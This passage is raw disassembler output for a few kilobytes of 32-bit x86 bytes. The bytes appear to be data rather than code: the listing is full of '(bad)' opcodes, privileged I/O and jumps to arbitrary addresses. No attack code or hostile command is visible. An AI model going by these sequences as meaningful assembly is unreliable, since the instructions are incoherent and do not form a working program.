  5142cf:	xor    BYTE PTR [ebp+0x36],cl
  5142d2:	ds (bad) 
  5142d4:	fdivr  DWORD PTR [ecx]
  5142d6:	or     BYTE PTR [esi+0x3d8696ef],0xef
  5142dd:	ret    0xc8f
  5142e0:	retf   
  5142e1:	mov    ch,0x85
  5142e3:	idiv   bh
  5142e5:	jb     0x5142b7
  5142e7:	xchg   esp,eax
  5142e8:	mov    eax,ds:0x5a492e03
  5142ed:	sbb    eax,0x567c3f7a
  5142f2:	stos   BYTE PTR es:[edi],al
  5142f3:	in     eax,0x17
  5142f5:	aaa    
  5142f6:	xchg   edx,eax
  5142f7:	lahf   
  5142f8:	and    ah,bh
  5142fa:	cld    
  5142fb:	lahf   
  5142fc:	(bad)  
  5142fd:	and    eax,DWORD PTR [ebp-0x53b9c1d5]
  514303:	add    bl,dh
  514305:	fs jl  0x514360
  514308:	jp     0x514326
  51430a:	std    
  51430b:	pop    es
  51430c:	mov    ah,0xdc
  51430e:	outs   dx,DWORD PTR ds:[esi]
  51430f:	mov    DWORD PTR [esi-0x518d7e85],esi
  514315:	xchg   esi,eax
  514316:	dec    ebx
  514317:	retf   0x3c39
  51431a:	lock test al,0x48
  51431d:	or     DWORD PTR [edi+0x45],0x4b83873
  514324:	jo     0x5142fb
  514326:	mov    edx,0xb16791b
  51432b:	fadd   st,st(4)
  51432d:	mov    dh,0x27
  51432f:	push   edi
  514330:	pop    edi
  514331:	imul   esp,DWORD PTR [ebx-0x1a],0x1d
  514335:	add    dh,BYTE PTR [ebx+edx*4-0x9ccf10]
  51433c:	aaa    
  51433d:	push   es
  51433e:	add    dl,BYTE PTR [esp+eax*8+0x47]
  514342:	push   edx
  514343:	or     al,0xe
  514345:	mov    eax,0xccb23409
  51434a:	mov    ah,0xd8
  51434c:	pop    ecx
  51434d:	xor    eax,0xbd57cb4a
  514352:	pop    edx
  514353:	outs   dx,BYTE PTR ds:[esi]
  514354:	pushf  
  514355:	pop    edi
  514356:	dec    esi
  514357:	inc    edi
  514358:	addr16 ret 
  51435a:	mov    ah,0xef
  51435c:	test   eax,0xea0e092f
  514361:	cmp    ebx,ecx
  514363:	and    BYTE PTR [edx+0x11],0x3d
  514367:	cmp    esp,DWORD PTR [ebx-0x4e]
  51436a:	xor    BYTE PTR [eax-0x526ab421],dl
  514370:	jae    0x51437f
  514372:	add    dh,BYTE PTR [eax-0x1e]
  514375:	loopne 0x51437e
  514377:	sub    ah,BYTE PTR [eax+0x1d]
  51437a:	dec    esp
  51437b:	xchg   ecx,eax
  51437c:	retf   0xb3e6
  51437f:	fsubr  DWORD PTR [edx+0x6bfcfa54]
  514385:	or     ebx,DWORD PTR [eax-0x10]
  514388:	icebp  
  514389:	mov    eax,0xd674ab16
  51438e:	xchg   esp,eax
  51438f:	adc    al,0x9c
  514391:	adc    bl,BYTE PTR ds:0xdef7afe3
  514397:	xor    al,0xe0
  514399:	mov    dl,0x50
  51439b:	fld    DWORD PTR ds:0xd9f042d4
  5143a1:	pop    esi
  5143a2:	jns    0x51434f
  5143a4:	push   0x42f3f1f9
  5143a9:	adc    esi,ecx
  5143ab:	(bad)  
  5143ac:	div    ah
  5143ae:	jmp    DWORD PTR [esi+ecx*8-0x3]
  5143b2:	and    eax,0x1a6e08b
  5143b7:	fdivp  st(5),st
  5143b9:	or     esp,DWORD PTR [edi]
  5143bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5143bc:	data16 xor BYTE PTR [ebx-0x7d2aa339],dh
  5143c3:	outs   dx,BYTE PTR ds:[esi]
  5143c4:	loopne 0x51435d
  5143c6:	add    BYTE PTR [ecx+eax*1+0x473c9bc6],0x8a
  5143ce:	daa    
  5143cf:	jge    0x5143eb
  5143d1:	lods   al,BYTE PTR ds:[esi]
  5143d2:	mov    al,ds:0xff857388
  5143d7:	dec    esp
  5143d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5143d9:	mov    ds:0xbe356c19,eax
  5143de:	iretw  
  5143e0:	push   ds
  5143e1:	adc    al,bl
  5143e3:	add    al,0x11
  5143e5:	lock ja 0x5143c1
  5143e8:	cld    
  5143e9:	sub    ebx,esi
  5143eb:	out    0xd8,al
  5143ed:	push   cs
  5143ee:	int3   
  5143ef:	pop    eax
  5143f0:	sahf   
  5143f1:	and    esp,DWORD PTR [eax]
  5143f3:	inc    ecx
  5143f4:	pop    ds
  5143f5:	iret   
  5143f6:	dec    edi
  5143f7:	xor    eax,0x3b58cf4
  5143fc:	dec    esp
  5143fd:	mov    al,ds:0xafc99c9b
  514402:	adc    eax,0xbcb28bb3
  514407:	(bad)  
  514408:	mov    gs,WORD PTR [ebp+0x22]
  51440b:	xor    edi,ebx
  51440d:	pop    ecx
  51440e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51440f:	add    BYTE PTR [edi+ebp*1],ah
  514412:	mov    eax,0xf3df8f08
  514417:	dec    ebp
  514418:	sub    DWORD PTR [esi],ecx
  51441a:	iret   
  51441b:	mov    dl,0x20
  51441d:	sbb    al,0xae
  51441f:	or     BYTE PTR [ecx+0x3ca54f14],0xc2
  514426:	rcr    DWORD PTR [edi],cl
  514428:	enter  0x1b00,0xc5
  51442c:	test   eax,0xc4d1dcdc
  514431:	loop   0x51443d
  514433:	sub    dl,ch
  514435:	cmp    al,BYTE PTR [edx]
  514437:	add    al,0x69
  514439:	cmc    
  51443a:	mov    ds:0x2c3d5ea7,al
  51443f:	sar    DWORD PTR [ecx+0x6d965c49],cl
  514445:	mov    dl,0x43
  514447:	adc    al,ch
  514449:	sbb    DWORD PTR [ebp-0x5b],edi
  51444c:	and    al,0xe3
  51444e:	jg     0x5144b4
  514450:	push   ss
  514451:	fsub   QWORD PTR [esi]
  514453:	inc    eax
  514454:	mov    eax,ds:0x25775f8c
  514459:	inc    ebp
  51445a:	pop    esp
  51445b:	fcom   DWORD PTR [ecx]
  51445d:	ins    BYTE PTR es:[edi],dx
  51445e:	mov    esp,0x31298099
  514463:	or     DWORD PTR [edi-0x67],0xffffffc6
  514467:	aaa    
  514468:	push   esp
  514469:	inc    ecx
  51446a:	xor    BYTE PTR [esi-0x6e],0x42
  51446e:	cmp    DWORD PTR [ecx],0x4a
  514471:	(bad)  
  514472:	ds mov edx,0x5caadd7b
  514478:	push   esp
  514479:	xchg   esp,eax
  51447a:	pop    ds
  51447b:	fcom   QWORD PTR [ebp-0x17]
  51447e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51447f:	jmp    0x5e7f:0x2b5edb0d
  514486:	sbb    al,dh
  514488:	xchg   ecx,eax
  514489:	imul   esi,DWORD PTR [ecx+0x12a872de],0xffffff97
  514490:	push   ss
  514491:	dec    esi
  514492:	mov    eax,ds:0x59f397ad
  514497:	inc    eax
  514498:	leave  
  514499:	in     al,dx
  51449a:	cmp    eax,0xb0b8022d
  51449f:	stc    
  5144a0:	fstp   TBYTE PTR [ebp-0x62]
  5144a3:	cmp    cl,BYTE PTR gs:[edx-0x79]
  5144a7:	ror    DWORD PTR [ebp-0x54],cl
  5144aa:	mov    eax,0x5d4ecb85
  5144af:	xchg   esi,eax
  5144b0:	(bad)  
  5144b2:	add    esi,DWORD PTR [edi-0x6c]
  5144b5:	(bad)  
  5144b6:	mov    cl,0x28
  5144b8:	je     0x514448
  5144ba:	fisub  DWORD PTR [ebp-0x5fc0db05]
  5144c0:	cli    
  5144c1:	int    0xc6
  5144c3:	and    eax,0xbe86b963
  5144c8:	jbe    0x5144c6
  5144ca:	dec    eax
  5144cb:	popf   
  5144cc:	out    dx,eax
  5144cd:	out    0xea,al
  5144cf:	addr16 pop eax
  5144d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5144d2:	fwait
  5144d3:	mov    DWORD PTR [ecx+0x8],0xea5988e
  5144da:	dec    ebp
  5144db:	fisub  DWORD PTR [esi]
  5144dd:	pop    ds
  5144de:	rcl    BYTE PTR [eax-0x73],1
  5144e1:	sub    BYTE PTR [ebp+esi*4-0x2da05626],ch
  5144e8:	inc    esi
  5144e9:	push   es
  5144ea:	mov    al,0xe2
  5144ec:	pop    ecx
  5144ed:	int    0x1f
  5144ef:	aad    0xb3
  5144f1:	mov    dl,0x70
  5144f3:	shl    dh,cl
  5144f5:	shl    DWORD PTR [eax-0xdc497a9],1
  5144fb:	and    cl,ch
  5144fd:	push   ecx
  5144fe:	mov    esp,0x5078f997
  514503:	and    eax,0xb60b4a1c
  514508:	iret   
  514509:	or     ebx,esi
  51450b:	retf   
  51450c:	push   0x5f
  51450e:	cld    
  51450f:	mov    cl,0xa4
  514511:	sbb    al,BYTE PTR [ebp+0x16]
  514514:	cmp    ebx,DWORD PTR [esi-0x4]
  514517:	in     eax,0xd0
  514519:	jne    0x5144fb
  51451b:	rol    eax,cl
  51451d:	sbb    al,0x82
  51451f:	addr16 adc bh,0xa1
  514523:	lds    bp,DWORD PTR [esi]
  514526:	stos   DWORD PTR es:[edi],eax
  514527:	xchg   ebp,eax
  514528:	pusha  
  514529:	aaa    
  51452a:	dec    edx
  51452b:	push   ecx
  51452c:	gs iret 
  51452e:	gs cdq 
  514530:	and    ebp,esi
  514532:	mov    ds:0x54b02bf5,eax
  514537:	in     eax,0xb4
  514539:	mov    ds:0xdc41e844,eax
  51453e:	pop    ebx
  51453f:	jge    0x51456b
  514541:	cmp    BYTE PTR [edi+0x4e832b8c],0x31
  514548:	ror    BYTE PTR [edi+0x24],1
  51454b:	adc    dl,ah
  51454d:	test   eax,0xb62239
  514552:	test   eax,0x1f7e85ad
  514557:	jb     0x514502
  514559:	add    ch,BYTE PTR ds:0xd05dc7c0
  51455f:	adc    eax,DWORD PTR [ebx+eax*4+0x5e46b133]
  514566:	repnz and BYTE PTR [edx+0x584897ab],bl
  51456d:	stos   DWORD PTR es:[edi],eax
  51456e:	sub    al,0x70
  514570:	inc    ecx
  514571:	push   esi
  514572:	gs lahf 
  514574:	or     al,0x5e
  514576:	pop    esp
  514577:	repnz ss mov ebp,esp
  51457b:	repnz push ss
  51457d:	mov    edi,0x45a21cea
  514582:	or     BYTE PTR [esi+ecx*8],ah
  514585:	(bad)  
  514586:	shl    BYTE PTR [ebp-0x4f],1
  514589:	scas   eax,DWORD PTR es:[edi]
  51458a:	sbb    esi,DWORD PTR [esp+eax*8+0x73334d5e]
  514591:	xchg   ch,cl
  514593:	push   cs
  514594:	mov    edx,ds
  514596:	and    eax,0x1b3ab158
  51459b:	je     0x5145b2
  51459d:	leave  
  51459e:	loop   0x51459c
  5145a0:	scas   al,BYTE PTR es:[edi]
  5145a1:	into   
  5145a2:	cld    
  5145a3:	scas   al,BYTE PTR es:[edi]
  5145a4:	aam    0x3
  5145a6:	bound  esi,QWORD PTR [edx]
  5145a8:	setp   BYTE PTR ds:0xa37dc2c5
  5145af:	shr    BYTE PTR [esi+0x74],1
  5145b2:	push   edi
  5145b3:	int    0xf9
  5145b5:	rol    DWORD PTR [eax+0x3d],0xb0
  5145b9:	xchg   esp,eax
  5145ba:	sahf   
  5145bb:	xchg   DWORD PTR [ebx-0x30],esp
  5145be:	push   eax
  5145bf:	lds    esi,FWORD PTR [edi-0x50]
  5145c2:	cmp    al,0x1f
  5145c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5145c5:	sar    BYTE PTR ss:[eax],cl
  5145c8:	push   cs
  5145c9:	out    dx,al
  5145ca:	mov    bl,0xba
  5145cc:	pusha  
  5145cd:	fucomip st,st(1)
  5145cf:	loopne 0x51460e
  5145d1:	out    dx,al
  5145d2:	xchg   esp,eax
  5145d3:	popa   
  5145d4:	and    eax,0x967ba922
  5145d9:	jbe    0x514588
  5145db:	jp     0x514622
  5145dd:	aad    0x2e
  5145df:	jecxz  0x514642
  5145e1:	push   0x7c365a9c
  5145e6:	clc    
  5145e7:	push   ss
  5145e8:	push   ds
  5145e9:	imul   edx,eax,0x8dd9dc1b
  5145ef:	sub    eax,0xe633728b
  5145f4:	cld    
  5145f5:	xor    al,0x27
  5145f7:	sbb    BYTE PTR [ecx],0x9d
  5145fa:	mov    esp,edx
  5145fc:	lahf   
  5145fd:	inc    eax
  5145fe:	mov    ebx,0x30719104
  514603:	sub    ah,dl
  514605:	fs call 0x6e7ef692
  51460b:	dec    ebp
  51460c:	mov    cs,edi
  51460e:	loope  0x51460a
  514610:	and    BYTE PTR [ebx],ah
  514612:	cmp    DWORD PTR [ebx],ebp
  514614:	and    esi,DWORD PTR [ebx]
  514616:	dec    esp
  514617:	arpl   WORD PTR [esi-0x21],bp
  51461a:	stc    
  51461b:	sub    eax,0xec1088e6
  514620:	in     eax,0x1b
  514622:	ret    0x594c
  514625:	pop    ss
  514626:	inc    esi
  514627:	aaa    
  514628:	dec    ebx
  514629:	out    dx,eax
  51462a:	dec    eax
  51462b:	dec    esp
  51462c:	in     eax,dx
  51462d:	dec    edi
  51462e:	xchg   BYTE PTR [esi-0x28],dl
  514631:	std    
  514632:	fstp   QWORD PTR [ebx+0x1a]
  514635:	jne    0x51467d
  514637:	inc    eax
  514638:	in     al,0xfb
  51463a:	arpl   WORD PTR [ebp+0x691ff4c0],di
  514640:	out    0x24,al
  514642:	(bad)  
  514643:	fldenv [ebp+0x2c]
  514646:	rcr    DWORD PTR [ecx+ecx*1-0x63],0xf9
  51464b:	jbe    0x514680
  51464d:	dec    edi
  51464e:	loopne 0x514620
  514650:	push   ss
  514651:	push   0xba33f06c
  514656:	adc    BYTE PTR [ebp+eiz*1+0x37],ch
  51465a:	and    al,0xb2
  51465c:	push   edx
  51465d:	outs   dx,DWORD PTR ds:[esi]
  51465e:	xchg   edx,eax
  51465f:	out    dx,eax
  514660:	aam    0x61
  514662:	jb     0x514632
  514664:	mov    esi,0x80b9c08
  514669:	jo     0x514618
  51466b:	fwait
  51466c:	adc    BYTE PTR [edi+0x77967779],bl
  514672:	pusha  
  514673:	sti    
  514674:	and    DWORD PTR [ecx+0x5d],0x30
  514678:	mov    ah,0x37
  51467a:	cld    
  51467b:	(bad)  
  51467c:	fadd   DWORD PTR [esi+0x7]
  51467f:	add    edx,esp
  514681:	sub    ebp,DWORD PTR [edi-0x7169e4cd]
  514687:	push   esp
  514688:	pusha  
  514689:	ds mov ch,0x3a
  51468c:	jo     0x514690
  51468e:	pop    es
  51468f:	pushf  
  514690:	stos   BYTE PTR es:[edi],al
  514691:	scas   eax,DWORD PTR es:[edi]
  514692:	mov    al,0x28
  514694:	or     al,0x23
  514696:	imul   esp,DWORD PTR [edx+ecx*8-0x49],0xffffffcf
  51469b:	jle    0x514687
  51469d:	push   ss
  51469e:	inc    ecx
  51469f:	push   eax
  5146a0:	inc    esi
  5146a1:	inc    eax
  5146a2:	add    ch,BYTE PTR [edi+0x3db0f7ff]
  5146a8:	(bad)  
  5146aa:	out    dx,eax
  5146ab:	lods   al,BYTE PTR ds:[esi]
  5146ac:	pop    eax
  5146ad:	mul    DWORD PTR [ebx+0x79]
  5146b0:	sbb    eax,0x4dd7c8f2
  5146b5:	iret   
  5146b6:	retf   
  5146b7:	imul   esi,DWORD PTR [edi-0x4],0xffffffdd
  5146bb:	push   0xffffffc4
  5146bd:	push   ebx
  5146be:	test   esp,ecx
  5146c0:	cwde   
  5146c1:	pop    ebx
  5146c2:	ins    BYTE PTR es:[edi],dx
  5146c3:	pop    ebp
  5146c4:	jne    0x5146af
  5146c6:	fnstcw WORD PTR [esi]
  5146c8:	dec    ecx
  5146c9:	sub    cl,BYTE PTR [ebp-0xf]
  5146cc:	mov    al,0x6e
  5146ce:	out    dx,eax
  5146cf:	lea    edx,[esi+edi*1]
  5146d2:	adc    BYTE PTR [edx-0x7cf49042],0x30
  5146d9:	ret    0xa38f
  5146dc:	cmc    
  5146dd:	inc    eax
  5146de:	mov    al,0x59
  5146e0:	(bad)  
  5146e1:	pop    edx
  5146e2:	test   BYTE PTR [ecx],bh
  5146e4:	add    esi,DWORD PTR [edx-0x715dd40c]
  5146ea:	jp     0x5146f1
  5146ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5146ed:	or     edi,DWORD PTR [ebx+edi*4+0x403a5c45]
  5146f4:	je     0x5146e4
  5146f6:	icebp  
  5146f7:	adc    eax,0x2b227f41
  5146fc:	sbb    DWORD PTR [ebx+0x32],edi
  5146ff:	das    
  514700:	mov    ss,ecx
  514702:	cs (bad) 
  514704:	idiv   BYTE PTR [ebx+0x3]
  514707:	mov    ah,0x12
  514709:	iret   
  51470a:	jg     0x51468e
  51470c:	dec    edx
  51470d:	das    
  51470e:	shl    DWORD PTR [ecx-0x53],1
  514711:	cmp    BYTE PTR [edx-0x7f425428],0xe
  514718:	(bad)  
  514719:	xor    DWORD PTR [ebx],ecx
  51471b:	pop    edx
  51471c:	test   eax,0x54a7dd07
  514721:	inc    ebp
  514722:	adc    ecx,ecx
  514724:	xchg   edx,eax
  514725:	adc    ch,BYTE PTR [bp+si-0x596b]
  51472a:	pop    eax
  51472b:	arpl   WORD PTR [edx+0x67],di
  51472e:	inc    edi
  51472f:	ja     0x5146e1
  514731:	call   0x6ae8:0xc8fe87da
  514738:	imul   ecx,ebp,0xffffff81
  51473b:	pop    eax
  51473c:	(bad)  
  51473d:	sbb    cl,BYTE PTR [ecx]
  51473f:	es inc eax
  514741:	pusha  
  514742:	gs aaa 
  514744:	std    
  514745:	adc    DWORD PTR [edi+0x6d8908a5],ebp
  51474b:	mov    ebp,0x71c565a1
  514750:	or     BYTE PTR [esi*8+0x4800f96c],ch
  514757:	rol    BYTE PTR [ebx-0x5d],1
  51475a:	push   ecx
  51475b:	and    edi,DWORD PTR ds:0x294048d4
  514761:	xchg   edi,eax
  514762:	lds    edx,FWORD PTR [ebx-0x5f]
  514765:	adc    DWORD PTR [ebx+0x39],esi
  514768:	jmp    0x5147e6
  51476a:	mov    WORD PTR [edi+ebp*8-0x75],?
  51476e:	mov    esp,0x93be18ee
  514773:	out    0xd,al
  514775:	icebp  
  514776:	adc    DWORD PTR [ebx+0x45e6eb6f],esi
  51477c:	mov    WORD PTR [ecx-0x21751508],?
  514782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  514783:	xor    cl,BYTE PTR [edx]
  514785:	mov    esp,0x656f4388
  51478a:	xlat   BYTE PTR ds:[ebx]
  51478b:	xchg   edx,eax
  51478c:	jmp    0x514809
  51478e:	jmp    0x51476a
  514790:	fsubr  QWORD PTR [ecx+0x38978b03]
  514796:	imul   ebx,edi,0x4f632f29
  51479c:	mov    al,0x19
  51479e:	push   ecx
  51479f:	push   esi
  5147a0:	fist   DWORD PTR [eax+edx*1]
  5147a3:	or     al,0x81
  5147a5:	pop    ebx
  5147a6:	loop   0x514773
  5147a8:	cs jp  0x5147b3
  5147ab:	sbb    dh,BYTE PTR [esi+0x1de40af1]
  5147b1:	or     ebp,DWORD PTR [ebp+0x578dd6de]
  5147b7:	pop    ebp
  5147b8:	jbe    0x5147a4
  5147ba:	jb     0x5147be
  5147bc:	xor    edi,esi
  5147be:	jl     0x514783
  5147c0:	sub    BYTE PTR [esi],0x77
  5147c3:	mov    eax,0x630b2ee7
  5147c8:	jns    0x514784
  5147ca:	in     al,dx
  5147cb:	adc    DWORD PTR [edx+ebx*2+0x4a],0xfffffff5
  5147d0:	pop    esp
  5147d1:	add    eax,0x46425f7
  5147d6:	std    
  5147d7:	sub    bl,BYTE PTR cs:[ecx-0x1c3cbe3f]
  5147de:	xchg   ecx,eax
  5147df:	(bad)  
  5147e0:	cs call 0x64246e84
  5147e6:	dec    edx
  5147e7:	mov    ah,0x88
  5147e9:	mov    dh,0x5b
  5147eb:	sbb    DWORD PTR [esi],0x18499694
  5147f1:	xor    al,0xd5
  5147f3:	and    eax,0xf67923d6
  5147f8:	aaa    
  5147f9:	adc    DWORD PTR [edi+ebx*8],0x459b4323
  514800:	outs   dx,BYTE PTR ds:[esi]
  514801:	inc    ecx
  514802:	cdq    
  514803:	xchg   edi,ecx
  514805:	mov    ds:0x62761e97,al
  51480a:	pop    ebx
  51480b:	or     ebx,DWORD PTR [edx+0x1e198053]
  514811:	aad    0x2b
  514813:	mov    bl,0x63
  514815:	aad    0x67
  514817:	ret    0xccd5
  51481a:	fadd   QWORD PTR [ebx-0x4c52fbc1]
  514820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  514821:	xchg   esi,eax
  514822:	xor    eax,DWORD PTR [edx]
  514824:	arpl   ax,di
  514826:	daa    
  514827:	and    eax,0xe0f237e8
  51482c:	fpatan 
  51482e:	dec    ebp
  51482f:	fnstcw WORD PTR [ebx+ebx*1]
  514832:	icebp  
  514833:	cmp    bl,BYTE PTR [edx]
  514835:	xor    al,0x5b
  514837:	inc    eax
  514838:	push   ebx
  514839:	mov    ebp,DWORD PTR [ebp+edx*4-0x7ecfe362]
  514840:	les    esi,FWORD PTR [eax-0x80]
  514843:	cmc    
  514844:	inc    ecx
  514845:	xchg   ebx,eax
  514846:	adc    al,0x61
  514848:	pop    ebp
  514849:	jg     0x514880
  51484b:	sbb    esi,0xffffffdc
  51484e:	or     DWORD PTR [edx+0x3acd2989],ebx
  514854:	xor    al,0xbc
  514856:	or     eax,0x76a795f9
  51485b:	xchg   esp,eax
  51485c:	jge    0x51482b
  51485e:	dec    ebp
  51485f:	mov    ds:0x5f054e1,al
  514864:	dec    ebp
  514865:	test   DWORD PTR [edx],edi
  514867:	fldcw  WORD PTR [edi+0x79ca7430]
  51486d:	jecxz  0x51481f
  51486f:	call   0x4b15:0xfcf253e8
  514876:	push   ss
  514877:	cld    
  514878:	(bad)  
  51487a:	push   edx
  51487b:	pop    ss
  51487c:	jmp    0x95a96cfa
  514881:	inc    ebp
  514882:	add    al,0x2
  514884:	mov    al,ds:0xc1bbaf10
  514889:	cli    
  51488a:	lods   al,BYTE PTR ds:[esi]
  51488b:	fs xchg edx,eax
  51488d:	inc    ebp
  51488e:	xchg   esi,eax
  51488f:	sub    ah,BYTE PTR [edi+0x62]
  514892:	lahf   
  514893:	mov    ebp,0x5fbd1f2a
  514898:	ficomp DWORD PTR [eax-0x1eee9cf7]
  51489e:	popa   
  51489f:	add    BYTE PTR [edx-0x4f],bh
  5148a2:	cmp    eax,0x4e1976f4
  5148a7:	test   esp,ebp
  5148a9:	dec    esp
  5148aa:	pop    ecx
  5148ab:	ja     0x51488a
  5148ad:	aas    
  5148ae:	enter  0x81da,0xaf
  5148b2:	bound  esp,QWORD PTR [ecx-0x35]
  5148b5:	jb     0x51488c
  5148b7:	les    ecx,FWORD PTR [edi]
  5148b9:	or     dl,bh
  5148bb:	adc    esp,DWORD PTR [ecx]
  5148bd:	mov    edi,0x4ecafc9b
  5148c2:	aas    
  5148c3:	mov    al,ds:0xa6272059
  5148c8:	in     al,0xb2
  5148ca:	mov    ah,0x42
  5148cc:	pushf  
  5148cd:	dec    ecx
  5148ce:	adc    ebx,DWORD PTR [esi]
  5148d0:	leave  
  5148d1:	dec    edi
  5148d2:	inc    esi
  5148d3:	fisubr DWORD PTR [esi-0x5278abc5]
  5148d9:	loope  0x514872
  5148db:	push   0xffffffae
  5148dd:	mov    ah,0x27
  5148df:	cld    
  5148e0:	ss jp  0x51490e
  5148e3:	test   eax,0xdbd51e41
  5148e8:	(bad)  
  5148e9:	inc    ecx
  5148ea:	jne    0x514945
  5148ec:	fstp   DWORD PTR [eax]
  5148ee:	or     dh,cl
  5148f0:	cmp    dh,BYTE PTR [edx]
  5148f2:	push   cs
  5148f3:	test   eax,0x19b3d26c
  5148f8:	xor    BYTE PTR [ecx],bl
  5148fa:	add    ecx,DWORD PTR [eax+0x48de342b]
  514900:	(bad)  
  514901:	les    ecx,FWORD PTR [eax]
  514903:	arpl   WORD PTR [ebx],bx
  514905:	cld    
  514906:	mov    ch,0xd0
  514908:	push   ss
  514909:	pop    ecx
  51490a:	mov    bh,0x2f
  51490c:	cmc    
  51490d:	lahf   
  51490e:	mov    bh,0x2a
  514910:	data16 adc bl,BYTE PTR [ebp-0x66]
  514914:	hlt    
  514915:	pop    esi
  514916:	add    al,BYTE PTR [esp+edx*1+0x5b49c385]
  51491d:	call   0x7c06433f
  514922:	leave  
  514923:	push   ss
  514924:	xchg   esp,eax
  514925:	xchg   ebx,eax
  514926:	sbb    eax,0xe0e26812
  51492b:	jne    0x5148fd
  51492d:	dec    edx
  51492e:	(bad)  
  514930:	je     0x5148e0
  514932:	idiv   DWORD PTR [edx+0x4b]
  514935:	pop    ecx
  514936:	addr16 loope 0x514968
  514939:	lock nop
  51493b:	es fs clc 
  51493e:	push   0xffffffa6
  514940:	push   ebx
  514941:	ficom  WORD PTR [ebp-0x46352909]
  514947:	lods   eax,DWORD PTR ds:[esi]
  514948:	aam    0xe6
  51494a:	loopne 0x514924
  51494c:	mov    esp,0x3b4e24eb
  514951:	frstor [edi-0x460dc926]
  514957:	jne    0x51492d
  514959:	stos   DWORD PTR es:[edi],eax
  51495a:	addr16 pop es
  51495c:	mov    ecx,DWORD PTR [esi+0x34]
  51495f:	xchg   ebx,eax
  514960:	xor    al,0x16
  514962:	mov    DWORD PTR [eax+0x2e],edi
  514965:	std    
  514966:	jo     0x51490f
  514968:	or     BYTE PTR [edi+0x27],cl
  51496b:	loop   0x5149d7
  51496d:	lods   eax,DWORD PTR ds:[esi]
  51496e:	dec    eax
  51496f:	mov    eax,ds:0x760fb337
  514974:	sub    ah,BYTE PTR [esi-0x53]
  514977:	cwde   
  514978:	xchg   ebx,eax
  514979:	jp     0x514903
  51497b:	je     0x514975
  51497d:	out    0xb0,eax
  51497f:	mov    esi,0xa27368dd
  514984:	jae    0x5149f6
  514986:	nop
  514987:	jb     0x514a07
  514989:	or     al,0xe6
  51498b:	rol    DWORD PTR [esi-0x3898fa8a],cl
  514991:	ins    DWORD PTR es:[edi],dx
  514992:	pop    esp
  514993:	aad    0x84
  514995:	and    ecx,DWORD PTR [esp+eiz*8-0x14]
  514999:	call   0xc4c94867
  51499e:	jl     0x514952
  5149a0:	ficomp DWORD PTR [edx+esi*4]
  5149a3:	push   esi
  5149a4:	xor    edi,DWORD PTR [edx]
  5149a6:	and    bl,ch
  5149a8:	fucomip st,st(3)
  5149aa:	std    
  5149ab:	cdq    
  5149ac:	add    ch,BYTE PTR [ebx-0x6a07102]
  5149b2:	pop    edi
  5149b3:	sub    DWORD PTR [ecx+0x5e],ebp
  5149b6:	sahf   
  5149b7:	mov    al,ds:0xa62875f0
  5149bc:	inc    eax
  5149bd:	sahf   
  5149be:	aad    0x9c
  5149c0:	(bad)  
  5149c1:	fstp   QWORD PTR [edx-0x7d96ed4]
  5149c7:	cmp    ebx,DWORD PTR [edx-0x3a82c945]
  5149cd:	inc    edx
  5149ce:	xchg   esi,eax
  5149d0:	mov    esp,0x8ea787d0
  5149d5:	fsub   QWORD PTR [ecx-0x77]
  5149d8:	push   ebx
  5149d9:	push   ecx
  5149da:	cmp    DWORD PTR [ebx-0x3e],ebx
  5149dd:	lock and DWORD PTR [ebx-0x12005593],esi
  5149e4:	adc    DWORD PTR [ebx-0x76afea51],0xfcca76ff
  5149ee:	mov    dl,0x2e
  5149f0:	inc    ecx
  5149f1:	ret    
  5149f2:	mov    ch,ah
  5149f4:	into   
  5149f5:	imul   ebx,esp,0x8a8288a7
  5149fb:	in     al,dx
  5149fc:	outs   dx,BYTE PTR ds:[esi]
  5149fd:	jl     0x5149a9
  5149ff:	add    ecx,DWORD PTR [edx+eax*8+0x48]
  514a03:	aad    0x77
  514a05:	dec    ebp
  514a06:	stos   BYTE PTR es:[edi],al
  514a07:	call   0xd1a:0xeeb69bde
  514a0e:	push   eax
  514a0f:	jnp    0x5149ab
  514a11:	add    DWORD PTR [eax],edx
  514a13:	dec    ebp
  514a14:	dec    edx
  514a15:	(bad)
  514a18:	mov    ds:0x3dbdeb32,eax
  514a1d:	cmp    BYTE PTR [edx+0x994206],0x31
  514a24:	mov    edi,0x8e4bbc93
  514a29:	mov    ah,0xe
  514a2b:	or     BYTE PTR [eax+eiz*4],ch
  514a2e:	pop    edx
  514a2f:	add    al,BYTE PTR [esi-0x3f]
  514a32:	imul   ecx,esi,0xd60a8ce4
  514a38:	sar    eax,0x92
  514a3b:	inc    esp
  514a3c:	pop    edi
  514a3d:	mov    edi,fs
  514a3f:	inc    esi
  514a40:	je     0x514a56
  514a42:	scas   eax,DWORD PTR es:[edi]
  514a43:	add    ebx,ecx
  514a45:	in     eax,dx
  514a46:	dec    eax
  514a47:	xchg   BYTE PTR [esi],cl
  514a49:	in     al,dx
  514a4a:	loopne 0x514a0d
  514a4c:	adc    ecx,ebp
  514a4e:	sti    
  514a4f:	adc    edi,eax
  514a51:	add    dl,BYTE PTR [esi+edi*4]
  514a54:	aaa    
  514a55:	out    0xd1,eax
  514a57:	and    ah,cl
  514a59:	mov    bh,0xd8
  514a5b:	mov    esp,0x365836a
  514a60:	lods   al,BYTE PTR ds:[esi]
  514a61:	push   ds
  514a62:	loopne 0x514abc
  514a64:	rcl    DWORD PTR [edi],1
  514a66:	dec    ebx
  514a67:	and    eax,0xf0d77427
  514a6c:	jge    0x514a28
  514a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  514a6f:	cmp    dh,bl
  514a71:	(bad)  [edx+0x55]
  514a74:	adc    eax,0xb6df794d
  514a79:	and    eax,0x194de9bb
  514a7e:	jp     0x514a42
  514a80:	add    al,0xc7
  514a82:	cmp    eax,eax
  514a84:	out    0xd3,al
  514a86:	mov    ebp,0x16e5ecff
  514a8b:	sbb    BYTE PTR [eax],0x7
  514a8e:	ins    DWORD PTR es:[edi],dx
  514a8f:	add    BYTE PTR [edi],cl
  514a91:	or     ebp,0x52ef7a8b
  514a97:	stos   DWORD PTR es:[edi],eax
  514a98:	test   bh,cl
